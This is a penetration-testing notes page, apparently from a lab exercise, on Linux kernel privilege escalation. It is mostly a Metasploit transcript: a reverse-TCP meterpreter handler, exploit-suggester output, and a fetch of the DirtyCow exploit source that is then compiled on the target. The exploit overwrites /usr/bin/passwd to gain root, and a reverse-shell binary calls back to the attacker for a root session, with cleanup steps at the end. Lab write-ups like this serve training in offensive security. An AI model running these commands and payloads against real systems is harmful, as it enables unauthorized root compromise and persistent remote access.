# Kernel Exploits

## 01 - Unix Shell

When enumerating for the kernel version manually through the manual steps on the Enumeration and Discovery section for [[System and Kernel Version]]. Once you're able to find the information with many ways to do it manually. Use the `searchsploit` tool to find the specific linux kernel version. However I must give you warning and advise. Exploiting kernel vulnerabilities may have the potential to cause the Linux machine to crash I would suggest you to keep it as last resort or you don't have any other way.

After you've executed the command browse around a bit of any particular vulnerability you're looking yet I do have a better suggestion to make this procedure even faster if you're not aware of the popular kernel exploits and it keeps happening maybe a few months or a year ago. Keep up with the cybersecurity news in order to ensure you are well informed.

`$ searchsploit linux kernel <version_number>`

Sometimes enumerating manually can be daunting and especially in a non-simulated cyber intrusion attackers have little time to spare to go through those steps due to any reasonable circumstances. That's why other developers have made auditing tools that could help us save more time. I highly suggest with **Linux-Exploit-Suggester** or **LinPEAS** for this scenario. Head towards to **Auditing Tools** section.

## 02 - Metasploit

### 2.1 - Detect

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set lhost 10.8.145.108
lhost => 10.8.145.108
msf6 exploit(multi/handler) > set lport 53
lport => 53
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.8.145.108:53
[*] Sending stage (989032 bytes) to 10.10.198.41
[*] Meterpreter session 1 opened (10.8.145.108:53 -> 10.10.198.41:53103) at 2022-05-23 13:11:27 -0400

meterpreter > getuid
Server username: TCM
meterpreter > sysinfo
Computer     : debian.localdomain
OS           : Debian 6.0.10 (Linux 2.6.32-5-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > run post/linux/gather/enum_system

[+] Info:
[+]     Debian GNU/Linux 6.0
[+]     Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
[+]     Module running as "TCM" user
[*] Linux version stored in /root/.msf4/loot/20220523213906_default_10.10.54.27_linux.enum.syste_431671.txt
..[snip]..
meterpreter > run post/multi/recon/local_exploit_suggester showdescription=true

[*] 10.10.54.27 - Collecting local exploits for x64/linux...
[*] 10.10.54.27 - 47 exploit checks are being tried...
[+] 10.10.54.27 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
  This module exploits a vulnerability in the Linux Kernel's
  watch_queue event notification system. It relies on a heap
  out-of-bounds write in kernel memory. The exploit may fail on the
  first attempt so multiple attempts may be needed. Note that the
  exploit can potentially cause a denial of service if multiple failed
  attemps occur, however this is unlikely.
[+] 10.10.54.27 - exploit/linux/local/ptrace_sudo_token_priv_esc: The service is running, but could not be validated.
  This module attempts to gain root privileges by blindly injecting
  into the session user's running shell processes and executing
  commands by calling `system()`, in the hope that the process has
  valid cached sudo tokens with root privileges. The system must have
  gdb installed and permit ptrace. This module has been tested
  successfully on: Debian 9.8 (x64); and CentOS 7.4.1708 (x64).
[+] 10.10.54.27 - exploit/linux/local/rds_rds_page_copy_user_priv_esc: The target appears to be vulnerable.
  This module exploits a vulnerability in the `rds_page_copy_user`
  function in `net/rds/page.c` (RDS) in Linux kernel versions 2.6.30
  to 2.6.36-rc8 to execute code as root (CVE-2010-3904). This module
  has been tested successfully on: Fedora 13 (i686) kernel version
  2.6.33.3-85.fc13.i686.PAE; and Ubuntu 10.04 (x86_64) with kernel
  version 2.6.32-21-generic.
meterpreter > 


user@pentestos:~$ ./linux-exploit-suggester.sh -u "Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux"

Available information:

Kernel version: 2.6.32
Architecture: x86_64
Distribution: debian
Distribution version: N/A
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): N/A
Package listing: N/A

Searching among:

73 kernel space exploits
0 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},[ RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31} ],RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
..[snip]..
```

### 2.2 - Exploit

```
user@pentestos:~$ mkdir exploit && cd exploit
user@pentestos:~$ wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c

meterpreter > pwd
/home/user
meterpreter > mkdir exploit
Creating directory: exploit
meterpreter > upload exploit/c0w.c exploit/
[*] uploading  : /home/user/Documents/thm/linuxprivesc/exploit/c0w.c -> exploit/
[*] uploaded   : /home/user/Documents/thm/linuxprivesc/exploit/c0w.c -> exploit//c0w.c
meterpreter > cd exploit
meterpreter > execute -if gcc -a "-pthread c0w.c -o c0w"
Process 2803 created.
Channel 97 created.
meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 2828 created.
Channel 99 created.
TCM@debian:~/exploit$ ls
ls
c0w  c0w.c
TCM@debian:~/exploit$ ./c0w
./c0w

   (___)
   (o o)_____/
    @@ `     \
     \ ____, //usr/bin/passwd
     //    //
    ^^    ^^
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 3752f000

madvise 0

ptrace 0

TCM@debian:~/exploit$ passwd
passwd
root@debian:/home/user/exploit# id
id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:/home/user/exploit# cd ..
cd ..
root@debian:/home/user# ./rsh_x64 &
./rsh_x64 &
[1] 2865
root@debian:/home/user# exit
exit
exit
TCM@debian:~/exploit$ exit
exit
exit
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.8.145.108:53 
[*] Sending stage (3020772 bytes) to 10.10.54.27
[*] Meterpreter session 2 opened (10.8.145.108:53 -> 10.10.54.27:37893) at 2022-05-23 22:10:26 -0400

meterpreter > getuid
Server username: root
```

### 2.3 - Cleanup

```
meterpreter > rm /usr/bin/passwd
meterpreter > cp /tmp/bak /usr/bin/passwd
```

## References

- [Linux Kernel Exploits](https://github.com/SecWiki/linux-kernel-exploits)